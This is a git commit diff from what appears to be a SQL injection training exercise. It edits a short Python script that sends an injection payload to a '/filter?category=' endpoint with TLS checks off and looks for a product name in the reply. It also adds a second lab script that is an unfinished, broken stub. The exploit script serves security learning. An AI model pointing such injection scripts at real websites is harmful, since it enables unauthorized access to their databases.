f16c7baf8be41eb5c906b3eb39035befccb9b75d
emonhossain151 <ehosan151@gmail.com>
2025-03-08 23:55:49 +0600

    lab2

--- SQLi/lab_1.py
+++ SQLi/lab_1.py
@@ -9,7 +9,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def exploit_sqli(url, payload):
     uri = '/filter?category='
     req = requests.get(url + uri + payload, verify = False)
-    if "Cat Grin" in req.text:
+    if "Your Virtual Journey" in req.text:
         return True
     else:
         return False
@@ -20,8 +20,8 @@ if __name__ == "__main__":
         url = sys.argv[1].strip()
         payload = sys.argv[2].strip()
     except IndexError:
-        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
         print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
+        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
         sys.exit()
 
     if exploit_sqli(url, payload):
---
+++ SQLi/lab_2.py
@@ -0,0 +1,12 @@
+import requests
+import sys
+import urllib3
+
+# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+
+
+
+if __name__ == '__main__':
+    try:
+
+    except:
